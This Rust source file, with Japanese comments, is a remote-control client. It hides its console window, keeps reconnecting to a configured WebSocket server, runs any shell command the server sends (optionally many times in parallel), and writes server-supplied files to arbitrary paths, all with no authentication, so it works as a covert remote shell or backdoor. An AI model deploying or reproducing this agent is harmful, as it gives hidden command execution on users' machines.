#![windows_subsystem = "windows"]

extern crate common;

use common::remote_control::*;

use std::ffi::OsStr;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::Command;
use std::thread::{sleep, JoinHandle};
use std::time::Duration;
use ws::{connect, Handler, Sender};
use ws::{Handshake, Message, Result as WResult};

fn main() {
    let config = read_config_ini();

    let ip = format!("ws://{}:{}", config.ip, config.port);

    loop {
        connect(ip.clone(), |out| Client { out }).unwrap_or_else(|e| {
            log_error(MyError::new(
                e,
                "サーバーとの通信中にエラーが発生しました".to_string(),
            ))
        });
        sleep(Duration::new(3, 0));
    }
}

/// `CONFIG_FILE`をもとにファイルを読み込み、MyConfigを返します
///
/// # Panics
/// * `MyConfig::from_configfile()`にてMyConfigを適切に読み込めなかった際
///
/// Panicします
fn read_config_ini() -> MyConfig {
    let configfile_path: &Path = Path::new(CONFIG_FILE);
    MyConfig::from_configfile(configfile_path).unwrap_or_else(|e| {
        log_error(e);
        std::process::exit(-1);
    })
}

struct Client {
    out: Sender,
}

impl Handler for Client {
    fn on_open(&mut self, _: Handshake) -> WResult<()> {
        self.out.send("接続を確立しました")
    }

    fn on_message(&mut self, msg: Message) -> WResult<()> {
        eprintln!("メッセージを受け取りました");
        match msg {
            Message::Text(txt) => self.out.send(format!("Echo:{}", txt)),
            Message::Binary(bytes) => {
                eprintln!("バイナリメッセージを受け取りました");
                let msg = process_bytes(&bytes);
                let msg = bincode::serialize(&msg);
                match msg {
                    Err(e) => self.out.send(format!(
                        "メッセージのエンコーディング時にエラーが発生しました:{:?}",
                        e
                    )),
                    Ok(msg) => self.out.send(Message::Binary(msg)),
                }
            }
        }
    }
}

fn process_bytes(bytes: &[u8]) -> MyResponse {
    let msg = bincode::deserialize(&bytes)
        .map_err(|e| MyError::new(e, "バイト列の解凍中にエラーが発生しました".to_string()))?;
    process_msg(msg)
}

fn make_command(cmd: &str) -> Command {
    if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.arg("/C").arg(OsStr::new(&cmd));
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-C").arg(OsStr::new(&cmd));
        c
    }
}

fn process_msg(msg: MyMessage) -> MyResponse {
    let msg = match msg {
        MyMessage::Echo(s) => MyResponseKind::Echo(format!("Echo : {}", s)),
        MyMessage::RunCommand {
            command: cmd,
            exec_number: n,
        } => {
            if n == 1 {
                let mut command = make_command(&cmd);
                let (sender, receiver) = std::sync::mpsc::channel();
                let _thread: JoinHandle<Result<(), MyError>> = std::thread::spawn(move || {
                    let output = command.output().map_err(|e| {
                        MyError::new(e, "コマンドの実行時にエラーが発生しました".to_string())
                    })?;
                    let s = MyResponseKind::RunCommand {
                        stdout: encoding_rs::SHIFT_JIS
                            .decode(&output.stdout)
                            .0
                            .trim()
                            .trim_end()
                            .to_string(),
                        stderr: encoding_rs::SHIFT_JIS
                            .decode(&output.stderr)
                            .0
                            .trim()
                            .trim_end()
                            .to_string(),
                    };
                    sender.send(s).map_err(|e| {
                        MyError::new(
                            e,
                            "コマンド実行結果をスレッドに送信する際にエラーが発生しました"
                                .to_string(),
                        )
                    })?;
                    Ok(())
                });
                receiver
                    .recv_timeout(std::time::Duration::new(3, 0))
                    .map_err(|e| {
                        MyError::new(
                            e,
                            "コマンド実行結果をスレッドから受信する際にエラーが発生しました"
                                .to_string(),
                        )
                    })?
            } else {
                for _ in 0..n {
                    let mut command = make_command(&cmd);
                    let _: JoinHandle<Result<(), MyError>> = std::thread::spawn(move || {
                        command.output().map_err(|e| {
                            MyError::new(e, "コマンドの実行時にエラーが発生しました".to_string())
                        })?;
                        Ok(())
                    });
                }
                MyResponseKind::RunCommand {
                    stdout: "実行回数が2回以上の際は取得することができません".to_string(),
                    stderr: "実行回数が2回以上の際は取得することができません".to_string(),
                }
            }
        }
        MyMessage::SendFile { filename, contents } => {
            let mut f = File::create(&filename)
                .map_err(|e| MyError::new(e, "ファイル作成時にエラーが発生しました".to_string()))?;
            f.write_all(&contents[..].as_bytes()).map_err(|e| {
                MyError::new(
                    e,
                    "ファイルにデータを書き込む際にエラーが発生しました".to_string(),
                )
            })?;
            f.flush().map_err(|e| {
                MyError::new(
                    e,
                    "ファイルにデータを書き込み、Flushする際にエラーが発生しました".to_string(),
                )
            })?;
            MyResponseKind::SendFile
        }
    };

    Ok(msg)
}
